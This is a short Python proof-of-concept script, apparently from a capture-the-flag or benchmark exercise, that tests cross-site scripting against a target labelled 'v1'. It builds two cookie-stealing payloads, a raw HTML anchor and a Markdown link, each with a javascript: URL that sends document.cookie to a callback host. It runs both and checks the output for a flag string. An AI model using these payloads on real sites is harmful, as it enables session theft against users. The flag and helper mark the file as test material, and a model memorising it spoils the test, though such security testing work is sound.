import sys
sys.path.insert(0, '.')
from poc_common import run_payload, CB

FLAG = "PCBFLAG_82160422a14c"

seed = "<a href='javascript:document.location=\"" + CB + "\"+document.cookie'>CLICKME</a>"
md   = "[CLICKME](" + "javascript:document.location='" + CB + "'+document.cookie)"

print("=== SEED raw-html on v1 ===")
r = run_payload(seed, "v1")
print(r)
print("flag present:", FLAG in r)

print("=== MARKDOWN link on v1 ===")
r = run_payload(md, "v1")
print(r)
print("flag present:", FLAG in r)
